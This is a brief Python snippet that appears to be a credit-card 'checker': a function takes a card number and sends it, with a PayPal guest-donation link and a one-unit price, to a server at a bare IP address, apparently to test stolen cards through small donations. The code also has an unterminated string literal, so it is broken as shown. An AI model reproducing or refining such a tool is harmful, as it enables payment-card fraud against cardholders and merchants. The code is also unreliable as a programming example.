import requests
def chkk(ccx):
	cc=ccx.strip()
	urll="https://www.paypal.com/donate/guest?token=RvX9hIw1OfGBrxAFQI15_e2NA0iFEQS-ziSEjT60OcFL6c9vB462D1LpebsUd8Nam6znAJdWgRGkN-4x
	price="1"
	res=requests.get(f'http://151.247.197.54:5500/paypal?cc={cc}&url={urll}&price={1}').text
	return res
